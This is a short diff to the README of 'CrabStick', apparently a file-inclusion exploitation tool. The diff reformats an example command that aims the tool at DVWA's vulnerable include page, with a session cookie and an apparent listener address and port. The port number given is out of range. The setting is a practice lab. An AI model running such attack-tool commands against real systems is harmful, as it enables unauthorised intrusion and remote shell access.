@@ -90,7 +90,9 @@ Created as a small project to help me learn
 #### Example 
 
 ```
-root@HackHut:~/Pycharm/CrabStick# python3 Crab.py --cookie="security=low; PHPSESSID=981bcdda6a93e3a85126345587df7f8f" --url="http://192.168.0.57/dvwa/vulnerabilities/fi/?page=include.php" -i 192.168.0.48 -p 444444 -d 
+root@HackHut:~/Pycharm/CrabStick# python3 Crab.py --cookie="security=low;
+PHPSESSID=981bcdda6a93e3a85126345587df7f8f" --url="http://192.168.0.57/dvwa/vulnerabilities/fi/?page=include.php"
+-i 192.168.0.48 -p 444444 -d 
          ,__,
     (/__/\oo/\__(/
       _/\/__\/\_
